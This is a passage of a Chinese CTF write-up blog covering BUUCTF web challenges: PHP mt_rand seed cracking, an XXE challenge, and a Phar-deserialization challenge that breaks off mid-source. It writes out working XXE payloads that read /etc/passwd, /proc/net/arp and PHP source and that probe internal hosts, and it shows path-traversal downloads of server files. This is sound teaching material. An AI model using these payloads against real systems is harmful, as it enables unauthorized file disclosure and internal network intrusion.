61.6 Mseeds/s </span><br><span class="line">seed = 0x0f8bea05 = 260827653 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 57.9 Mseeds/s </span><br><span class="line">Found 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么利用给好的源码自己把完整的串生成出来:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">260827653</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">chcRo2MtG9M6I3roNmwa</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221026114918358.png" alt="image-20221026114918358" style="zoom:67%;" /><br><hr><br><h1 id="XXE-爆破内网网段-True-XML-cookbook"><a href="#XXE-爆破内网网段-True-XML-cookbook" class="headerlink" title="[XXE,爆破内网网段]True XML cookbook"></a>[XXE,爆破内网网段]True XML cookbook</h1><p><img src="/images/buuctf-web2/image-20221026123210924.png" alt="image-20221026123210924"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;124&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>输出一下<code>doLogin</code>的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里获取了登录的账号密码, 能够登录成功, 但是并没有什么用</p><p>读取以下敏感文件,看看有没有线索:</p><p><code>/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;333&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/proc/net/arp</code>: 看一下其他的内网主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///proc/net/arp&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;333&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221026143315937.png" alt="image-20221026143315937" style="zoom:67%;" /><p><code>/etc/hosts</code>:</p><img src="/images/buuctf-web2/image-20221026141936123.png" alt="image-20221026141936123" style="zoom:67%;" /><p><code>/proc/net/fib_trie</code>路由缓存<img src="/images/buuctf-web2/image-20221026142234341.png" alt="image-20221026142234341" style="zoom:67%;" /></p><p>上面发现的两个可疑IP,使用php协议来读取一下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://10.244.80.130&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221026142509275.png" alt="image-20221026142509275" style="zoom:67%;" /><p><code>10.128.253.12</code>没有响应</p><p>解码出来发现只是登录页面的源码..</p><p>这里需要使用burpsuite的<code>intruder</code>模块对内网所在的网段进行爆破:</p><img src="/images/buuctf-web2/image-20221026152052357.png" alt="image-20221026152052357" style="zoom:67%;" /><p>payload就设置为1-255  (这里没有找到burpsuite怎么设置请求的超时时间,爆破得很慢很慢..)</p><img src="/images/buuctf-web2/image-20221026152026476.png" alt="image-20221026152026476" style="zoom:67%;" /><br><hr><br><h1 id="Phar反序列化-pop链-Dropbox"><a href="#Phar反序列化-pop链-Dropbox" class="headerlink" title="[Phar反序列化,pop链]Dropbox"></a>[Phar反序列化,pop链]Dropbox</h1><p>注册账号登录后上传文件, 这里上传一个php文件后提示只允许上传图片类文件</p><p><img src="/images/buuctf-web2/image-20221026155802018.png" alt="image-20221026155802018"></p><p>上传文件之后发现能够下载, 点击后会跳转到<code>download.php</code>来下载,并通过post中的<code>filename</code>来传文件名</p><p>那么直接下载<code>index.php</code>和<code>download.php</code>(开始不知道在哪个目录,就在文件名前面加<code>../</code>直到能够下载)</p><img src="/images/buuctf-web2/image-20221026155953438.png" alt="image-20221026155953438" style="zoom:67%;" /><p><code>index,php</code>中还包含了<code>class.php</code>,也下载下来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>download.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>); <span class="comment">//限制php函数可读写文件的范围</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123; <span class="comment"># 登录后进去看到的那个文件列表</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>); <span class="comment"># 扫描文件目录,得到包括所有文件名的数组</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]); <span class="comment"># 删除上面数组中的&quot;.&quot; 和 &quot;..&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();  <span class="comment"># 对每一个文件创建一个File对象</span></span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>); <span class="comment"># 调用后面file的open方法,检测其是否存在和是否为目录</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>); <span class="comment"># 将当前这个file对象加入 files数组中</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123; </span><br><span class="line">        <span class="comment">//调用__call时,根据传入的func,就会让$files中所有的file调用这个func,并把结果存入results</span></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>); <span class="comment">//将func加入funcs</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>(); <span class="comment"># 将每个file调用func方法的结果存入result数组中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span 